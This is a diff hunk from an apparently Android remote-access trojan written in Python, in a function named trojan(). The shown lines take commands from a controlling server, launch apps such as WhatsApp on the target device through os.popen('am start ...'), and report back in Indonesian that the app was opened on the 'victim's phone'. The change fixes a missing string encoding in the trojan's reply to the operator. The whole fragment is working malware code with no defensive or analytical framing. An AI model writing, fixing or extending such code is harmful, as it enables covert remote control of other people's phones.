@@ -28,7 +28,7 @@ def trojan():
  		elif 'run app' == server:
  			client.send(f'Use run app -l to view supported app'.encode("utf-8"))
  		elif 'run app -l' == server:
- 			client.send(f'List Apps\n=====\nchrome\nwhatsapp\n\n Atau Kamu Bisa Menjalnkan Aplikasi Lain, Gunakan Aplikasi Current Activity untuk Melihat package name app dan Activity\n\n\nContoh run com.mobile.legends/com.moba.unityplugin.MobaGameUnityActivity')
+ 			client.send(f'List Apps\n=====\nchrome\nwhatsapp\n\n Atau Kamu Bisa Menjalnkan Aplikasi Lain, Gunakan Aplikasi Current Activity untuk Melihat package name app dan Activity\n\n\nContoh run com.mobile.legends/com.moba.unityplugin.MobaGameUnityActivity'.encode("utf-8"))
  		elif 'run app whatsapp' == server or 'run app Whatsapp' == server:
  			os.popen('am start --user 0 -n com.whatsapp/com.whatsapp.Home.Activity')
  			client.send(f'Succes Membuka whatsapp Di Hp Korban'.encode("utf-8"))
